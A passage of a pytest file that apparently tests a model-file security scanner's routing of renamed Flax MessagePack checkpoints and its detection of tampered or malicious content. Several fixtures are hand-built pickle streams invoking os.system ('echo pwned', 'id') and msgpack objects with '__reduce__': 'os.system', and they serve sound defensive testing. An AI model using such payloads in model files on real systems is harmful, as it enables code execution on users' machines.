    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "model.flaxy"
    checkpoint.write_bytes(b"\x81\xa5state\x81\xa8selected\xc3")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is True


def test_scan_file_fails_closed_for_renamed_structural_msgpack_without_dependency(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "model.jpg"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
    monkeypatch.setitem(sys.modules, "msgpack", None)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(check.name == "msgpack Library Check" for check in result.checks)


def test_scan_file_routes_renamed_flax_stream_with_malicious_trailing_object(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb({"__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_renamed_flax_stream_with_later_checkpoint_object(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream-later-root.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"metadata": {"producer": "flax"}}, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("leading_scalar", [None, 123, 91], ids=["nil", "json-object-byte", "json-array-byte"])
def test_scan_file_routes_renamed_flax_stream_with_leading_scalar_object(
    tmp_path: Path,
    leading_scalar: int | None,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"stream-leading-scalar-{leading_scalar}.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(leading_scalar, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    assert file_detection.detect_file_format(str(checkpoint)) == "flax_msgpack"
    assert file_detection.detect_file_format_from_magic(str(checkpoint)) == "flax_msgpack"
    assert file_detection.detect_file_format_for_skip_filter(str(checkpoint)) == "flax_msgpack"

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_ignores_oversized_pickle_frame_near_match_in_flax_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "frame-near-match.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({}, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(4, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb([-1, -1, -1, -1, -1], use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    assert "pickle" in file_detection.detect_flax_msgpack_overlap_routes(
        str(checkpoint),
        include_unvalidated_pickle=True,
    )
    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is True
    assert not any(check.name == "Pickle Structural Tamper Check" for check in result.checks)


@pytest.mark.parametrize("prefix", [b"I1\n.", b"cbuiltins\nstr\n.", b"\x80\x04."])
def test_scan_file_routes_renamed_flax_stream_after_pickle_shaped_prefix(tmp_path: Path, prefix: bytes) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream-pickle-prefix.jpg"
    checkpoint.write_bytes(
        prefix
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("nested", [False, True], ids=["direct", "nested"])
def test_scan_file_complete_pickle_does_not_merge_inconclusive_flax(tmp_path: Path, nested: bool) -> None:
    payload = pickle.dumps((complex(1, 2), {f"field{i}": i for i in range(2500)}), protocol=4)
    complete_pickle = tmp_path / "complete.pkl"
    complete_pickle.write_bytes(payload)

    assert file_detection.has_inconclusive_renamed_flax_msgpack_routing(complete_pickle)

    target = complete_pickle
    expected_scanner = "pickle"
    if nested:
        target = tmp_path / "complete.zip"
        _create_misnamed_zip(target, {"complete.pkl": payload})
        expected_scanner = "zip"

    result = scan_file(str(target), config={"cache_scan_results": False})

    assert result.scanner_name == expected_scanner
    assert result.success is True
    assert "flax_msgpack_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)


def test_scan_file_still_detects_flax_after_complete_pickle_prefix(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "complete-pickle-prefix.jpg"
    checkpoint.write_bytes(
        pickle.dumps(None, protocol=4)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_preserves_pickle_findings_in_protocol0_flax_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream-malicious-protocol0-prefix.jpg"
    checkpoint.write_bytes(
        _build_malicious_pickle(protocol=0)
        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.parametrize("leading_scalar", [123, 91, 60], ids=["json-object-byte", "json-array-byte", "xml-angle-byte"])
def test_scan_file_routes_nested_renamed_flax_stream_with_delimiter_like_scalar(
    tmp_path: Path,
    leading_scalar: int,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = flax_msgpack_scanner.msgpack.packb(
        leading_scalar, use_bin_type=True
    ) + flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
        use_bin_type=True,
    )
    archive = tmp_path / f"nested-leading-scalar-{leading_scalar}.zip"
    _create_misnamed_zip(archive, {"payload.jpg": nested_payload})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_nested_renamed_flax_stream_after_protocol0_pickle_prefix(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = b"cbuiltins\nstr\n." + flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
        use_bin_type=True,
    )
    archive = tmp_path / "nested-protocol0-prefix.zip"
    _create_misnamed_zip(archive, {"payload.jpg": nested_payload})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize(
    "prefix",
    [
        b"\x80\x04",
        b"\x80\x04(2.",
        b"\x80\x04NNa.",
        b"\x80\x04\x95" + struct.pack("<Q", 1_000_000) + b"N.",
        b"\x80\x04}(Nu.",
        b"\x80\x04(Nd.",
    ],
    ids=["binary-header", "mark-dup", "invalid-append", "overlong-frame", "odd-setitems", "odd-dict"],
)
def test_scan_file_does_not_merge_pickle_failure_for_binary_header_like_flax_stream(
    tmp_path: Path,
    prefix: bytes,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "binary-header-like-flax.jpg"
    checkpoint.write_bytes(
        prefix
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is True
    assert all("pickle" not in (check.name + check.message).lower() for check in result.checks)


def test_scan_file_selected_pickle_does_not_claim_binary_header_like_flax_stream(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "selected-binary-header-like-flax.jpg"
    checkpoint.write_bytes(
        b"\x80\x04"
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"scanners": ["pickle"], "cache_scan_results": False})

    assert result.scanner_name != "pickle"
    assert all("pickle parsing failed" not in check.message.lower() for check in result.checks)


def test_scan_file_selected_pickle_does_not_claim_nested_binary_header_like_flax_stream(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = b"\x80\x04" + flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}},
        use_bin_type=True,
    )
    archive = tmp_path / "selected-binary-header-like-flax.zip"
    _create_misnamed_zip(archive, {"payload.jpg": payload})

    result = scan_file(str(archive), config={"scanners": ["zip", "pickle"], "cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert all("pickle parsing failed" not in check.message.lower() for check in result.checks)


def test_scan_file_preserves_binary_pickle_findings_when_stop_follows_probe_window(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "delayed-binary-pickle-stop.jpg"
    pickle_stream = (
        b"\x80\x04cos\nsystem\n(S'echo pwned'\ntR" + (b"N0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 2 + 1)) + b"."
    )
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


def test_scan_file_preserves_binary_pickle_findings_when_dangerous_opcode_follows_probe_window(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "late-binary-pickle-dangerous-global.jpg"
    pickle_stream = (
        b"\x80\x04" + (b"N0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 2 + 1)) + b"cos\nsystem\n(S'echo pwned'\ntR."
    )
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("opcode", "operand"),
    [(b"q", b"\x00"), (b"r", b"\x00\x00\x00\x00"), (b"p", b"0\n")],
    ids=["binput", "long-binput", "put"],
)
def test_scan_file_preserves_binary_pickle_findings_when_operand_crosses_probe_boundary(
    tmp_path: Path,
    opcode: bytes,
    operand: bytes,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"binary-pickle-{opcode.hex()}-boundary.jpg"
    malicious_prefix = b"\x80\x04cos\nsystem\n(S'echo pwned'\ntR"
    padding_size = file_detection.PROTO0_1_MAX_PROBE_BYTES - len(malicious_prefix) - 1
    neutral_padding = (b"N0" * (padding_size // 2)) + (b"N" if padding_size % 2 else b"")
    pickle_stream = malicious_prefix + neutral_padding + opcode + operand + b"."
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert (
        pickle_stream[file_detection.PROTO0_1_MAX_PROBE_BYTES - 1 : file_detection.PROTO0_1_MAX_PROBE_BYTES] == opcode
    )
    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.parametrize(
    "pickle_stream",
    [
        b"\x80\x04Ncos\nsystem\n(S'echo pwned'\ntR.",
        b"\x80\x04}q\x00Nq\x00cos\nsystem\n(S'echo pwned'\ntR.",
    ],
    ids=["extra-return-stack-item", "memo-overwrite"],
)
def test_scan_file_preserves_unpickler_permitted_binary_pickle_findings(
    tmp_path: Path,
    pickle_stream: bytes,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "unpickler-permitted-overlap.jpg"
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


def test_scan_file_preserves_dangerous_list_setitem_binary_pickle_findings(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "list-setitem-overlap.jpg"
    pickle_stream = b"\x80\x04]NaK\x00cos\nsystem\n(S'id'\ntRs."
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


def test_scan_file_preserves_binary_pickle_structural_tamper_in_flax_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "structural-tamper-overlap.jpg"
    checkpoint.write_bytes(
        b"\x80\x04\x80\x04K\x01."
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(check.name == "Pickle Structural Tamper Check" for check in result.checks)


def test_scan_file_preserves_nested_binary_pickle_structural_tamper_in_flax_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = b"\x80\x04\x80\x04K\x01." + flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}},
        use_bin_type=True,
    )
    archive = tmp_path / "structural-tamper-overlap.zip"
    _create_misnamed_zip(archive, {"payload.jpg": payload})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(check.name == "Pickle Structural Tamper Check" for check in result.checks)


@pytest.mark.parametrize(
    "scanner_config",
    [{"exclude_scanners": ["flax_msgpack"]}, {"scanners": ["pickle"]}],
    ids=["excluded-flax", "exact-pickle"],
)
def test_scan_file_preserves_selected_pickle_findings_in_flax_content_overlap(
    tmp_path: Path,
    scanner_config: dict[str, list[str]],
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "selected-list-setitem-overlap.jpg"
    pickle_stream = b"\x80\x04]NaK\x00cos\nsystem\n(S'id'\ntRs."
    checkpoint.write_bytes(
        pickle_stream
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={**scanner_config, "cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("kind") == "preferred"
        and check.details.get("skipped_scanner_id") == "flax_msgpack"
        for check in result.checks
    )


def test_scan_file_does_not_raise_for_deep_json_array_near_match(tmp_path: Path) -> None:
    payload = tmp_path / "deep-json-array.jpg"
    payload.write_bytes((b"[" * 2000) + b"0" + (b"]" * 2000))

    assert file_detection.detect_file_format(str(payload)) == "unknown"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "unknown"
    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "unknown"

    direct_result = scan_file(str(payload), config={"cache_scan_results": False})
    archive = tmp_path / "deep-json-array.zip"
    _create_misnamed_zip(archive, {"payload.jpg": payload.read_bytes()})
    nested_result = scan_file(str(archive), config={"cache_scan_results": False})

    assert direct_result.scanner_name == "unknown"
    assert direct_result.success is True
    assert nested_result.scanner_name == "zip"
    assert nested_result.success is True


def test_scan_file_fails_closed_for_ambiguous_json_looking_stream_before_later_flax_root(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "json-looking-padding.jpg"
    checkpoint.write_bytes(
        b"["
        + b" " * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert core_module.determine_exit_code(aggregate) == 2


@pytest.mark.parametrize("suffix", [".jpg", ".txt"])
def test_scan_file_fails_closed_for_renamed_flax_stream_with_scalar_padding_past_analysis_limit(
    tmp_path: Path, suffix: str
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"stream-scalar-padding{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(None, use_bin_type=True) * 4097
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    limit_issues = [issue for issue in result.issues if "unvalidated trailing data" in issue.message]
    assert len(limit_issues) == 1
    assert limit_issues[0].details["max_msgpack_stream_objects"] == 4096
    assert limit_issues[0].details["parsed_object_count"] == 4096
    assert result.metadata["operational_error_reason"] == "msgpack_stream_object_limit_exceeded"
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_routes_renamed_flax_state_wrapper_with_malicious_attribute(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "state-wrapper.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"state": {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("suffix", [".jpg", ".flax"])
@pytest.mark.parametrize(
    "embedded_bytes",
    [
        b"\n4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n",
        (
            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
            b" CompositeFunction primitive_functions "
        ),
        (
            b"\x00tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
            b"tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
        ),
    ],
)
def test_scan_file_keeps_flax_analysis_when_payload_contains_embedded_format_signature(
    tmp_path: Path,
    suffix: str,
    embedded_bytes: bytes,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"embedded{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"params": {"blob": embedded_bytes}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "malicious.flax"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("suffix", [".ckpt", ".checkpoint", ".orbax-checkpoint"])
def test_scan_file_routes_msgpack_checkpoint_overlap_suffixes_to_flax_scanner(tmp_path: Path, suffix: str) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"malicious{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml", ".conf"])
def test_scan_file_routes_malicious_flax_checkpoint_under_skipped_suffix(tmp_path: Path, suffix: str) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"malicious{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_large_malicious_renamed_flax_msgpack_with_later_root_to_flax_scanner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "malicious.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {
                "metadata": "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100),
                "params": {"w": [1, 2, 3]},
                "__reduce__": "os.system",
            },
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
def test_scan_file_analyzes_renamed_flax_after_confirmed_root_exceeds_routing_budget(
    tmp_path: Path,
    wrapped: bool,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    params = {f"f{i}": i for i in range(2100)}
    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
    checkpoint_state["__reduce__"] = "os.system"
    checkpoint = tmp_path / f"confirmed-root-{wrapped}.jpg"
    checkpoint.write_bytes(flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True))

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert not any(check.name == "MessagePack Routing Analysis Limit" for check in result.checks)
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
def test_scan_file_analyzes_nested_renamed_flax_after_confirmed_root_exceeds_routing_budget(
    tmp_path: Path,
    wrapped: bool,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    params = {f"f{i}": i for i in range(2100)}
    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
    checkpoint_state["__reduce__"] = "os.system"
    archive = tmp_path / f"confirmed-root-{wrapped}.zip"
    _create_misnamed_zip(
        archive,
        {"payload.jpg": flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True)},
    )

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_fails_closed_for_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    limit_check = next(check for check in result.checks if check.name == "MessagePack Routing Analysis Incomplete")
    assert (
        limit_check.message
        == "Flax MessagePack analysis incomplete because bounded routing inspection could not complete"
    )
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_renamed_msgpack_routing_read_cannot_complete(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "unavailable.jpg"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(file_detection, "_probe_flax_msgpack_checkpoint_file", lambda _path: None)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_for_small_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous-small.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert checkpoint.stat().st_size < FLAX_MSGPACK_STRUCTURE_READ_BYTES
